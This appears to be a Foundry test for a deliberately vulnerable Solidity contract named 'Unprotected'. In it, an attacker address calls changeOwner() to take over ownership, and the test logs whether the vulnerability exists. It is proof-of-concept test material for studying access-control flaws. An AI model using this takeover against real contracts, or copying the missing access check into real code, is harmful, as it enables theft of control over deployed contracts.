// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unprotected0.sol";

contract UnprotectedTest is Test {
    Unprotected public unprotectedContract;
    address public deployer = address(0xB0B);
    address public attacker = address(0xA11CE);

    function setUp() public {
        vm.startPrank(deployer);
        unprotectedContract = new Unprotected();
        vm.stopPrank();
    }

    function test_unrestrictedOwnershipTransfer() public {
        console2.log("--- BEFORE-Trigger Ownership State ---");
        uint256 totalChangesBefore = unprotectedContract.totalOwnershipChanges();
        uint256 attackerChangesBefore = unprotectedContract.ownershipChangesByAddress(attacker);
        console2.log("Total ownership changes: %d", totalChangesBefore);
        console2.log("Attacker ownership changes: %d", attackerChangesBefore);
        
        console2.log("--- Trigger Ownership Change ---");
        // Attacker unauthorized ownership takeover
        vm.prank(attacker);
        unprotectedContract.changeOwner(attacker);
        console2.log("Attacker called changeOwner()");

        console2.log("--- AFTER-Trigger Ownership State ---");
        uint256 totalChangesAfter = unprotectedContract.totalOwnershipChanges();
        uint256 attackerChangesAfter = unprotectedContract.ownershipChangesByAddress(attacker);
        console2.log("Total ownership changes: %d", totalChangesAfter);
        console2.log("Attacker ownership changes: %d", attackerChangesAfter);
        
        // Compare state changes
        console2.log("--- Comparing State Changes ---");
        bool totalChanged = totalChangesAfter != totalChangesBefore;
        bool attackerChanged = attackerChangesAfter != attackerChangesBefore;
        console2.log("Total ownership changes different? %s", totalChanged ? "YES" : "NO");
        console2.log("Attacker ownership changes different? %s", attackerChanged ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (totalChanged && attackerChanged) {
            console2.log("Vulnerability Exists: Both total and attacker-specific counts changed after exploitation");
        } else {
            console2.log("Vulnerability not Exist: Ownership records unchanged despite attack attempt");
        }

        // Existing behavior verification
        console2.log("--- Existing Ownership Verification ---");
        vm.prank(deployer);
        vm.expectRevert();
        unprotectedContract.recordOwnershipActivity();

        vm.prank(attacker);
        unprotectedContract.recordOwnershipActivity();
    }
}